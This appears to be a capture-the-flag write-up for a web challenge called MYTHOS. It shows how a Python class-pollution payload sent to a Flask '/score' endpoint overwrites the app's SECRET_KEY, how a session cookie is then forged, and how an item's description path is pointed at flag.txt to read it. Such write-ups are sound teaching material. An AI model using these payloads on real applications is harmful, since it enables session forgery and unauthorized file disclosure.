+++
title = "MYTHOS"
date = 2025-08-15
authors = ["Vibhu Mehrotra"]
+++

## Summary
On the surface, this game appears to be similar to the terminal games played in the 1980s, where you get 1-4 options and based on your choice the story proceeds, everything is hardcoded. This simple version has only around 20 possibilities to go through and only 1 good ending which you can get only if you collect all the 'items' however, that is not sufficient to print the flag, the game on winning returns the descriptions of the items you hold.... So we need to somehow change the filepath of the description to the path of the flag to get the flag printed.

This is a very clever probem, requiring the exploitation of two seperate vulnerabilities 
- Overwriting the flask session key with a compromised key known to attacker. This can be done due to a poorly written copy function which doesn't sanitation the input
- Blindly reading a 'description file' without checking if it is in the authorised directory. 

simply put, our access to session key allows us to overwrite the path of a certain description file name, which is in a certain scenario printed out.

## Solution:

- Step 1: replace the app session key with our own compromised key
here is the python code where the key is defined, a random 40 bit key clearly infeasible to bruteforce
```python
app = Flask(__name__, static_url_path="", static_folder="static")
app.config["SECRET_KEY"] = rand_name(40)
```
The request we can use to overwrite the key is this one:

```python
@app.route("/score", methods=["POST"])
@game_session
def submit():
    score = ScoreSubmission(session["game"]["player"])
    copy(request.json, score)

    acquired_items = json.loads(session["items"].decode())
    score.items = acquired_items
    return score.toJSON()
```
the important lines are:
```python
score = ScoreSubmission(session["game"]["player"])
copy(request.json, score)

```
score is a an object storing the properties of the current session
and now we use copy to blindly copy request.json (our input) directly into score, i.e directly replacing the information in the session
so we use the following post request:
```python
s.post(URL + 'score', json={"__init__":{"__globals__":{"app":{"config":{"SECRET_KEY":NEW_SECRET}}}}})

```
withing copy, this occurs:
```python
setattr(dst, k, v) 
```
which basically blindly replaces wherever the key k is found with our user value v.

**We now have full control over the session cookies etc, and we can make requests 'as' the server itself**

- Now we need to do two things, get 'All' items in the game and then go through the game and reach the good ending (we can only reach good ending if the game sees that we have all the items)

we can do this by 
```python

s = requests.session()
r = s.get(URL)
data = FSCM.decode(s.cookies['session'],NEW_SECRET)
data['items'] = json.dumps({"mimic_gem": 1,"mermaid_scale":1,"angels_scarf":1,"mew_plaque":1,"Mythos":{"deserialize":"item_delegate"},"desc_filename":"flag.txt","name":"test"}).encode()

new_session = FSCM.encode(NEW_SECRET, str(data))
COOKIES = {'session': new_session}
```
What we are doing here is simple, we create a new HTTP session using the polluted key, and as part of the session creation we include the session data of items to be all the items in the game (required to reach win screen). 

item_delegate is:
```pm
my $game_artifacts = {
    item_delegate    => sub {
                            my $obj = shift; 
                            if (defined $obj->{desc_filename}) {
                                $obj->{desc} = read_file($obj->{desc_filename});
                                return {
                                    name=>$obj->{name},
                                    desc=>$obj->{desc}
                                    };
                                } return $obj;
                            },
    ....
};
```
So we basically pass in the name 'test' and file of description as flag.txt... so it simply reads the flag and returns it to us once we reach the 'good ending'.
Reaching the good ending is trivial since using the events.json provided to us we can map out the correct path.
>Credit for code and solution @Anony from the GCTF discord.


